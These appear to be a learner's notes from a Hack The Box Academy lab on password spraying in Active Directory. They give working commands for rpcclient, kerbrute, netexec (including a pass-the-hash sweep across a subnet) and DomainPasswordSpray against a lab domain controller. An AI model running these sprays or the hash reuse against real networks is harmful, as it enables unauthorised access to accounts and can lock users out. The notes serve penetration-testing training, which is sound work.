### From a linux host:
academy link [here](https://academy.hackthebox.com/module/143/section/1271).
bash one liner via rpcclient:
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

via kerbrute:
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

# for only successfull enteries:
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1 | grep +
```

via crackmapexec or netexec:
```shell
sudo netexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

> if we get local administrator account hash or password, first try to other local administrator's account so that we dont lockout any other domain account...it can be done by adding '--local-auth' flag
```shell
sudo netexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```


### From a Windows host:
academy link [here](https://academy.hackthebox.com/module/143/section/1422).

via DomainPasswordSpray:

git hub repo : [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
DomainPasswordSpray is highly effective tool for windows.
This tool and do many automated steps for us.

powershell commands:
```powershell
Import-Module .\DomainPasswordSpray.ps1

# here we not proving -Userfile flag..so it will autogenerate userlist. 
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

